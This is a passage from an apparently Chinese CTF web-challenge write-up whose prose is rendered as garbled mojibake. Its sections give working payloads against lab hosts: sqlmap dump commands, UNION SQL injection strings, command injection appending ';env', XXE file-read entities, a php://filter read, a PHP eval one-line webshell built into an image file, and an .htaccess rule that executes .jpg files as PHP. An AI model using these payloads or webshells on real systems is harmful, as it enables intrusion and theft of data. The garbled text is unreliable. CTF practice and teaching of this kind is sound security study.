src="/../images/image-20251013223357956-1760512687698-46.png" alt="image-20251013223357956"></p><h4 id="é¢„æœŸè§£2è€ƒç‚¹-ä¿®æ”¹html"><a href="#é¢„æœŸè§£2è€ƒç‚¹-ä¿®æ”¹html" class="headerlink" title="é¢„æœŸè§£2è€ƒç‚¹:ä¿®æ”¹html"></a>é¢„æœŸè§£2è€ƒç‚¹:ä¿®æ”¹html</h4><p><img src="/../images/image-20251013223817177-1760512687698-45.png" alt="image-20251013223817177"></p><p><img src="/../images/image-20251013223832803-1760512687698-44.png" alt="image-20251013223832803"></p><h3 id="01-ç¬¬ä¸€ç« -ç¥ç§˜çš„æ‰‹é•¯-revenge"><a href="#01-ç¬¬ä¸€ç« -ç¥ç§˜çš„æ‰‹é•¯-revenge" class="headerlink" title="01 ç¬¬ä¸€ç«  ç¥ç§˜çš„æ‰‹é•¯_revenge"></a><strong>01 ç¬¬ä¸€ç«  ç¥ç§˜çš„æ‰‹é•¯_revenge</strong></h3><h4 id="è€ƒç‚¹ï¼šçˆ†ç ´"><a href="#è€ƒç‚¹ï¼šçˆ†ç ´" class="headerlink" title="è€ƒç‚¹ï¼šçˆ†ç ´"></a>è€ƒç‚¹ï¼šçˆ†ç ´</h4><p>æ ¹æ®hintè®¿é—®&#x2F;wanyanzhou.txt.bak</p><p><img src="/../images/image-20251015110629525-1760512687698-51.png" alt="image-20251015110629525"></p><p>è¦é‡å¤æ”¾500æ¬¡çš„å¯†ç å®˜wpè¯´ç¦æ­¢äº†pythonç­‰ä¼ è¾“ï¼Œè¦ç”¨bpç­‰çˆ†ç ´500æ¬¡å°±èƒ½æ‹¿åˆ°flag</p><h3 id="02-ç¬¬äºŒç« -åˆè¯†é‡‘æ›¦ç„è½¨"><a href="#02-ç¬¬äºŒç« -åˆè¯†é‡‘æ›¦ç„è½¨" class="headerlink" title="02 ç¬¬äºŒç«  åˆè¯†é‡‘æ›¦ç„è½¨"></a><strong>02 ç¬¬äºŒç«  åˆè¯†é‡‘æ›¦ç„è½¨</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šä½ çŸ¥é“ä»€ä¹ˆæ˜¯httpè¯·æ±‚åŒ…å—ï¼ŸæŠ“ä¸€ä¸ªçœ‹çœ‹å§ï¼</span><br></pre></td></tr></table></figure><p>f12æŸ¥çœ‹æ¨¡ç³Šçš„å­—ç¬¦ä¸²ï¼Œå‰å¾€&#x2F;golden_trail</p><p><img src="/../images/image-20251013224031764-1760512687698-48.png" alt="image-20251013224031764"></p><h4 id="è€ƒç‚¹ï¼šæŠ“åŒ…"><a href="#è€ƒç‚¹ï¼šæŠ“åŒ…" class="headerlink" title="è€ƒç‚¹ï¼šæŠ“åŒ…"></a>è€ƒç‚¹ï¼šæŠ“åŒ…</h4><p><img src="/../images/image-20251013224913661-1760512687698-49.png" alt="image-20251013224913661"></p><h3 id="03-ç¬¬ä¸‰ç« -é—®å‰‘çŸ³ï¼ç¯¡å¤©æ”¹å‘½ï¼"><a href="#03-ç¬¬ä¸‰ç« -é—®å‰‘çŸ³ï¼ç¯¡å¤©æ”¹å‘½ï¼" class="headerlink" title="03 ç¬¬ä¸‰ç«  é—®å‰‘çŸ³ï¼ç¯¡å¤©æ”¹å‘½ï¼"></a><strong>03 ç¬¬ä¸‰ç«  é—®å‰‘çŸ³ï¼ç¯¡å¤©æ”¹å‘½ï¼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šä»™é—¨è¯•ç‚¼å°ä¸­å¤®çŸ—ç«‹ç€ç„å¤©å‰‘å®—è‡³å®&quot;é—®å‰‘çŸ³&quot;ï¼ŒçŸ³èº«æµè½¬ç€ä¸ƒå½©éœå…‰ã€‚ä½ ä½œä¸ºæ–°æ™‹å¼Ÿå­éœ€æµ‹è¯•å¤©èµ‹ï¼Œä½†æš—ä¸­çŸ¥æ™“é—®å‰‘çŸ³è¿ä½œçš„ç„æœºâ€”â€”å…¶å¤©èµ‹åˆ¤å®šå®åˆ™é€šè¿‡é‡‘æ›¦ç„è½¨ä¼ é€’ä¿¡æ¯ã€‚åˆå§‹æµ‹è¯•å°†æ˜¾ç¤ºå¤©èµ‹ï¼šBï¼Œå…‰èŠ’ï¼šæ— ï¼Œä½ éœ€è¦æ–½å±•&quot;ç¯¡å¤©æ”¹å‘½&quot;ä¹‹æœ¯ï¼Œä¿®æ”¹ç„è½¨ä¸­çš„å…³é”®å‚æ•°ï¼Œä½¿é—®å‰‘çŸ³æ˜¾ç°å¤©èµ‹ï¼šSï¼Œå…‰èŠ’ï¼šæµäº‘çŠ¶é’èŠ’(flowing_azure_clouds)çš„å¼‚è±¡ï¼Œä»è€Œè·å¾—å®—é—¨é‡è§†ï¼</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013230410807-1760512687699-58.png" alt="image-20251013230410807"></p><h4 id="è€ƒç‚¹ï¼šget-postè¯·æ±‚"><a href="#è€ƒç‚¹ï¼šget-postè¯·æ±‚" class="headerlink" title="è€ƒç‚¹ï¼šget&#x2F;postè¯·æ±‚"></a>è€ƒç‚¹ï¼šget&#x2F;postè¯·æ±‚</h4><p>æ³¨æ„postæ˜¯jsonæ ¼å¼å°±å¥½äº†</p><p><img src="/../images/image-20251013230448086-1760512687698-53.png" alt="image-20251013230448086"></p><h3 id="04-ç¬¬å››ç« -é‡‘æ›¦ç ´ç¦ä¸ä¸ƒç»å‚€å„¡é˜µ"><a href="#04-ç¬¬å››ç« -é‡‘æ›¦ç ´ç¦ä¸ä¸ƒç»å‚€å„¡é˜µ" class="headerlink" title="04 ç¬¬å››ç«  é‡‘æ›¦ç ´ç¦ä¸ä¸ƒç»å‚€å„¡é˜µ"></a><strong>04 ç¬¬å››ç«  é‡‘æ›¦ç ´ç¦ä¸ä¸ƒç»å‚€å„¡é˜µ</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šhttpè¯·æ±‚æœ‰å¾ˆå¤šè®²ç©¶ï¼è¯•è¯•å§ï¼</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šhttpåè®®"><a href="#è€ƒç‚¹ï¼šhttpåè®®" class="headerlink" title="è€ƒç‚¹ï¼šhttpåè®®"></a>è€ƒç‚¹ï¼šhttpåè®®</h4><p>ç¬¬ä¸€å…³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:11060/stone_golem?key=xdsec</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³<img src="/../images/image-20251013231927750-1760512687698-50.png" alt="image-20251013231927750"></p><p>ç¬¬ä¸‰å…³</p><p><img src="/../images/image-20251013232131503-1760512687698-52.png" alt="image-20251013232131503"></p><p>ç¬¬å››å…³</p><p><img src="/../images/image-20251013232220770-1760512687699-54.png" alt="image-20251013232220770"></p><p>ç¬¬äº”å…³</p><p><img src="/../images/image-20251013232344908-1760512687699-56.png" alt="image-20251013232344908"></p><p>ç¬¬å…­å…³</p><p><img src="/../images/image-20251013232428421-1760512687699-55.png" alt="image-20251013232428421"></p><p>ç¬¬ä¸ƒå…³</p><p><img src="/../images/image-20251013232541334-1760512687699-57.png" alt="image-20251013232541334"></p><p>å…¨éƒ¨å¯†é’¥åˆèµ·æ¥base64è§£å¯†å³å¯</p><h3 id="05-ç¬¬äº”ç« -æ‰“ä¸Šé—¨æ¥ï¼"><a href="#05-ç¬¬äº”ç« -æ‰“ä¸Šé—¨æ¥ï¼" class="headerlink" title="05 ç¬¬äº”ç«  æ‰“ä¸Šé—¨æ¥ï¼"></a><strong>05 ç¬¬äº”ç«  æ‰“ä¸Šé—¨æ¥ï¼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šCTFä¸­æœ‰ä¸€æ‹›åœ¨æ–‡ä»¶ç›®å½•ä¸­ç©¿æ¢­çš„æŠ€æ³•ï¼Œæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šç›®å½•ç©¿è¶Š"><a href="#è€ƒç‚¹ï¼šç›®å½•ç©¿è¶Š" class="headerlink" title="è€ƒç‚¹ï¼šç›®å½•ç©¿è¶Š"></a>è€ƒç‚¹ï¼šç›®å½•ç©¿è¶Š</h4><p><img src="/../images/image-20251013233525724-1760512687699-61.png" alt="image-20251013233525724"></p><h3 id="06-ç¬¬å…­ç« -è—ç»ç¦åˆ¶ï¼Ÿç„æœºåˆæ¢ï¼"><a href="#06-ç¬¬å…­ç« -è—ç»ç¦åˆ¶ï¼Ÿç„æœºåˆæ¢ï¼" class="headerlink" title="06 ç¬¬å…­ç«  è—ç»ç¦åˆ¶ï¼Ÿç„æœºåˆæ¢ï¼"></a><strong>06 ç¬¬å…­ç«  è—ç»ç¦åˆ¶ï¼Ÿç„æœºåˆæ¢ï¼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šä¸€ä¸ªç™»å½•é¡µé¢ã€‚ï¼ˆä¸å‘Šè¯‰æˆ‘è´¦å·å¯†ç å°±è®©æˆ‘ç™»å½•ï¼Œéš¾é“æˆ‘æ˜¯ç¥ä»™å—å“ˆå“ˆï¼Ÿï¼‰</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šsqlçš„ä¸‡èƒ½å¯†ç ç™»é™†"><a href="#è€ƒç‚¹ï¼šsqlçš„ä¸‡èƒ½å¯†ç ç™»é™†" class="headerlink" title="è€ƒç‚¹ï¼šsqlçš„ä¸‡èƒ½å¯†ç ç™»é™†"></a>è€ƒç‚¹ï¼šsqlçš„ä¸‡èƒ½å¯†ç ç™»é™†</h4><p><img src="/../images/image-20251013233713280-1760512687699-60.png" alt="image-20251013233713280"></p><h3 id="07-ç¬¬ä¸ƒç« -çµè››æ¢ç©´ä¸é˜´é˜³åŒç”Ÿç¬¦"><a href="#07-ç¬¬ä¸ƒç« -çµè››æ¢ç©´ä¸é˜´é˜³åŒç”Ÿç¬¦" class="headerlink" title="07 ç¬¬ä¸ƒç«  çµè››æ¢ç©´ä¸é˜´é˜³åŒç”Ÿç¬¦"></a><strong>07 ç¬¬ä¸ƒç«  çµè››æ¢ç©´ä¸é˜´é˜³åŒç”Ÿç¬¦</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šæœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­˜æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨äºå‘ŠçŸ¥æœç´¢å¼•æ“çˆ¬è™«å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸åº”è¢«æŠ“å–ã€‚å®ƒæ˜¯ç½‘ç«™ä¸æœç´¢å¼•æ“ä¹‹é—´çš„ â€œåè®®â€ï¼Œå¸®åŠ©ç½‘ç«™ç®¡ç†çˆ¬è™«çš„è®¿é—®è¡Œä¸ºï¼Œä¿æŠ¤éšç§å†…å®¹ã€èŠ‚çœæœåŠ¡å™¨èµ„æºæˆ–å¼•å¯¼çˆ¬è™«ä¼˜å…ˆæŠ“å–é‡è¦é¡µé¢ã€‚</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šrobots-txtï¼Œmd5å¼±æ¯”è¾ƒ"><a href="#è€ƒç‚¹ï¼šrobots-txtï¼Œmd5å¼±æ¯”è¾ƒ" class="headerlink" title="è€ƒç‚¹ï¼šrobots.txtï¼Œmd5å¼±æ¯”è¾ƒ"></a>è€ƒç‚¹ï¼šrobots.txtï¼Œmd5å¼±æ¯”è¾ƒ</h4><p>è®¿é—®&#x2F;robots.txt è¿›å…¥flag.php</p><p><img src="/../images/image-20251013234409035-1760512687699-59.png" alt="image-20251013234409035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2å‡ºç°æŠ¥é”™ï¼Œçœ‹å®˜wpæ˜¯åœ¨php8ç‰ˆæœ¬ä¸‹è¢«ç¦ç”¨äº†</span><br><span class="line"># å¼ºç›¸ç­‰</span><br><span class="line">/?a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span><br><span class="line"># å¼±ç›¸ç­‰</span><br><span class="line">/?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure><h3 id="08-ç¬¬å…«ç« -å¤©è¡çœŸè¨€ï¼Œæ˜Ÿå›¾æ˜¾åœ£"><a href="#08-ç¬¬å…«ç« -å¤©è¡çœŸè¨€ï¼Œæ˜Ÿå›¾æ˜¾åœ£" class="headerlink" title="08 ç¬¬å…«ç«  å¤©è¡çœŸè¨€ï¼Œæ˜Ÿå›¾æ˜¾åœ£"></a><strong>08 ç¬¬å…«ç«  å¤©è¡çœŸè¨€ï¼Œæ˜Ÿå›¾æ˜¾åœ£</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šå’Œä¸Šæ¬¡ä¸€æ ·çš„ç•Œé¢ï¼Œé‚£æˆ‘å†ç™»å½•ä¸€æ¬¡å°±è¡Œäº†â€¦â€¦å—ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šç®€å•çš„sqlæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šç®€å•çš„sqlæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šç®€å•çš„sqlæ³¨å…¥"></a>è€ƒç‚¹ï¼šç®€å•çš„sqlæ³¨å…¥</h4><p>sqlmapçš„ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=å®ˆé™µäºº&amp;password=å‘¨å¤©æ˜Ÿè¯€&quot; --batch --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=å®ˆé™µäºº&amp;password=å‘¨å¤©æ˜Ÿè¯€&quot; --batch -D user --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=å®ˆé™µäºº&amp;password=å‘¨å¤©æ˜Ÿè¯€&quot; --batch -D user -T flag --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=å®ˆé™µäºº&amp;password=å‘¨å¤©æ˜Ÿè¯€&quot; --batch -D user -T flag --dump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235658528-1760512687700-65.png" alt="image-20251013235658528"></p><p>æ‰‹æµ‹ã€å®˜wpã€‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; UNION SELECT 1,2 #</span><br><span class="line"># å›æ˜¾ Welcome 1</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_name,2 from information_schema.tables where table_schema=database() #</span><br><span class="line"># å›æ˜¾ Welcome flag</span><br><span class="line"></span><br><span class="line">1&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br><span class="line"># å›æ˜¾ Welcome value</span><br><span class="line"></span><br><span class="line">1&#x27; union select value,2 from flag #</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235903297-1760512687700-64.png" alt="image-20251013235903297"></p><h3 id="09-ç¬¬ä¹ç« -æ˜Ÿå¢Ÿç¦åˆ¶Â·å¤©æœºé—®è·¯"><a href="#09-ç¬¬ä¹ç« -æ˜Ÿå¢Ÿç¦åˆ¶Â·å¤©æœºé—®è·¯" class="headerlink" title="09 ç¬¬ä¹ç«  æ˜Ÿå¢Ÿç¦åˆ¶Â·å¤©æœºé—®è·¯"></a><strong>09 ç¬¬ä¹ç«  æ˜Ÿå¢Ÿç¦åˆ¶Â·å¤©æœºé—®è·¯</strong></h3><h4 id="è€ƒç‚¹ï¼š-URL-å‚æ•°ç›´æ¥å‘æœåŠ¡å™¨ç³»ç»Ÿå‘é€å‘½ä»¤"><a href="#è€ƒç‚¹ï¼š-URL-å‚æ•°ç›´æ¥å‘æœåŠ¡å™¨ç³»ç»Ÿå‘é€å‘½ä»¤" class="headerlink" title="è€ƒç‚¹ï¼š URL å‚æ•°ç›´æ¥å‘æœåŠ¡å™¨ç³»ç»Ÿå‘é€å‘½ä»¤"></a>è€ƒç‚¹ï¼š URL å‚æ•°ç›´æ¥å‘æœåŠ¡å™¨ç³»ç»Ÿå‘é€å‘½ä»¤</h4><p>å®˜wpç»™å‡ºçš„phpæ ¸å¿ƒæºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;url&#x27;];</span><br><span class="line">system(&quot;nslookup &quot; . $cmd);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=baidu.com;env</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014125213965-1760512687699-62.png" alt="image-20251014125213965"></p><h3 id="10-ç¬¬åç« -å¤©æœºç¬¦é˜µ"><a href="#10-ç¬¬åç« -å¤©æœºç¬¦é˜µ" class="headerlink" title="10 ç¬¬åç«  å¤©æœºç¬¦é˜µ"></a><strong>10 ç¬¬åç«  å¤©æœºç¬¦é˜µ</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šflagåœ¨flag.txté‡Œ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šxxeæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šxxeæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šxxeæ³¨å…¥"></a>è€ƒç‚¹ï¼šxxeæ³¨å…¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;è§£æ&gt;&amp;abc;&lt;/è§£æ&gt;</span><br></pre></td></tr></table></figure><h3 id="10-ç¬¬åç« -å¤©æœºç¬¦é˜µ-revenge"><a href="#10-ç¬¬åç« -å¤©æœºç¬¦é˜µ-revenge" class="headerlink" title="10 ç¬¬åç«  å¤©æœºç¬¦é˜µ_revenge"></a><strong>10 ç¬¬åç«  å¤©æœºç¬¦é˜µ_revenge</strong></h3><h4 id="è€ƒç‚¹ï¼šXXEæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šXXEæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šXXEæ³¨å…¥"></a>è€ƒç‚¹ï¼š<code>XXE</code>æ³¨å…¥</h4><p>flagçš„ä½ç½®ä¸åŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;è§£æ&gt;&amp;abc;&lt;/è§£æ&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015111745490-1760512687699-63.png" alt="image-20251015111745490"></p><h3 id="11-ç¬¬åä¸€ç« -åƒæœºå˜Â·ç ´å¦„ä¹‹çœ¼"><a href="#11-ç¬¬åä¸€ç« -åƒæœºå˜Â·ç ´å¦„ä¹‹çœ¼" class="headerlink" title="11 ç¬¬åä¸€ç«  åƒæœºå˜Â·ç ´å¦„ä¹‹çœ¼"></a><strong>11 ç¬¬åä¸€ç«  åƒæœºå˜Â·ç ´å¦„ä¹‹çœ¼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šHDdssçœ‹åˆ°äº† GET å‚æ•°åç”±m,n,o,p,qè¿™äº”ä¸ªå­—æ¯ç»„æˆï¼ˆæ¯ä¸ªå­—æ¯å‡ºç°ä¸”ä»…å‡ºç°ä¸€æ¬¡ï¼‰ï¼Œé•¿åº¦æ­£å¥½ä¸º 5ï¼Œè™½ç„¶ä¸æ¸…æ¥šå­—æ¯çš„å…·ä½“é¡ºåºï¼Œä½†æ˜¯ä»–çŸ¥é“å‚æ•°åç­‰äºå‚æ•°å€¼æ‰èƒ½è¿›å…¥ã€‚</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šçˆ†ç ´å‚æ•°åï¼Œphpä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#è€ƒç‚¹ï¼šçˆ†ç ´å‚æ•°åï¼Œphpä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="è€ƒç‚¹ï¼šçˆ†ç ´å‚æ•°åï¼Œphpä¼ªåè®®è¯»å–æ–‡ä»¶"></a>è€ƒç‚¹ï¼šçˆ†ç ´å‚æ•°åï¼Œphpä¼ªåè®®è¯»å–æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="12-ç¬¬åäºŒç« -ç‰é­„ç„å…³Â·ç ´å¦„"><a href="#12-ç¬¬åäºŒç« -ç‰é­„ç„å…³Â·ç ´å¦„" class="headerlink" title="12 ç¬¬åäºŒç«  ç‰é­„ç„å…³Â·ç ´å¦„"></a><strong>12 ç¬¬åäºŒç«  ç‰é­„ç„å…³Â·ç ´å¦„</strong></h3><h4 id="è€ƒç‚¹ï¼šè¿æ¥ä¸€å¥è¯æœ¨é©¬"><a href="#è€ƒç‚¹ï¼šè¿æ¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="è€ƒç‚¹ï¼šè¿æ¥ä¸€å¥è¯æœ¨é©¬"></a>è€ƒç‚¹ï¼šè¿æ¥ä¸€å¥è¯æœ¨é©¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šè¿™é“é¢˜ç”¨äºå­¦ä¹  èšå‰‘ çš„ä½¿ç”¨ï¼Œè¯·ä½¿ç”¨ èšå‰‘ å®Œæˆæœ¬é¢˜</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014130414238-1760512687700-66.png" alt="image-20251014130414238"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;env&quot;);</span><br></pre></td></tr></table></figure><h3 id="13-ç¬¬åä¸‰ç« -é€šå¹½å…³Â·çµçº¹è¯¡å½±"><a href="#13-ç¬¬åä¸‰ç« -é€šå¹½å…³Â·çµçº¹è¯¡å½±" class="headerlink" title="13 ç¬¬åä¸‰ç«  é€šå¹½å…³Â·çµçº¹è¯¡å½±"></a>13 ç¬¬åä¸‰ç«  é€šå¹½å…³Â·çµçº¹è¯¡å½±</h3><h4 id="è€ƒç‚¹ï¼šå›¾ç‰‡é©¬æ–‡ä»¶ä¸Šä¼ "><a href="#è€ƒç‚¹ï¼šå›¾ç‰‡é©¬æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="è€ƒç‚¹ï¼šå›¾ç‰‡é©¬æ–‡ä»¶ä¸Šä¼ "></a>è€ƒç‚¹ï¼šå›¾ç‰‡é©¬æ–‡ä»¶ä¸Šä¼ </h4><p>åªè¿‡æ»¤äº†jpgçš„æ–‡ä»¶å¤´ï¼Œåšä¸€ä¸ªå›¾ç‰‡é©¬å³å¯ï¼Œåç¼€éƒ½ä¸ç”¨æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 2.php/a 3.php</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014132349848-1760512687700-67.png" alt="image-20251014132349848"></p><h3 id="14-ç¬¬åå››ç« -å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘"><a href="#14-ç¬¬åå››ç« -å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘" class="headerlink" title="14 ç¬¬åå››ç«  å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘"></a><strong>14 ç¬¬åå››ç«  å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šApacheæœ‰ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼š-htaccessæ–‡ä»¶ä¸Šä¼ "><a href="#è€ƒç‚¹ï¼š-htaccessæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="è€ƒç‚¹ï¼š.htaccessæ–‡ä»¶ä¸Šä¼ "></a>è€ƒç‚¹ï¼š.htaccessæ–‡ä»¶ä¸Šä¼ </h4><p>å…ˆä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶,é‡å†™è§£æè§„åˆ™ï¼Œå½“PHPæ–‡ä»¶æ‰§è¡Œå°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åä¾æ—§æŠŠå›¾ç‰‡é©¬æ”¾ä¸Šå»å°±å¥½äº†</p><p><img src="/../images/image-20251014161940352-1760512687700-70.png" alt="image-20251014161940352"></p><h3 id="15-ç¬¬åäº”ç« -å½’çœŸå…³Â·ç«æ—¶å‡€é­”"><a href="#15-ç¬¬åäº”ç« -å½’çœŸå…³Â·ç«æ—¶å‡€é­”" class="headerlink" title="15 ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”"></a><strong>15 ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”</strong></h3><h4 id="è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ "><a href="#è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ "></a>è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šå›¾ç‰‡ä¸Šä¼ è‡³/uploads</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45588247/article/details/118796606">ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‘â€”â€”æ¡ä»¶ç«äº‰æ¼æ´_æ¡ä»¶ç«äº‰ä¸Šä¼ æ¼æ´-CSDNåšå®¢</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¡ä»¶ç«äº‰ï¼Œä¸€è¾¹ä½¿ç”¨çˆ†ç ´ä¸€ç›´é«˜é€Ÿä¸Šä¼ ä¸€ä¸ªæ™®é€šæœ¨é©¬æ–‡ä»¶ï¼Œä¸€è¾¹ä½¿ç”¨çˆ†ç ´è®¿é—®è¿™ä¸ªæœ¨é©¬æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><h3 id="16-ç¬¬åå…­ç« -æ˜†ä»‘æ˜Ÿé€”"><a href="#16-ç¬¬åå…­ç« 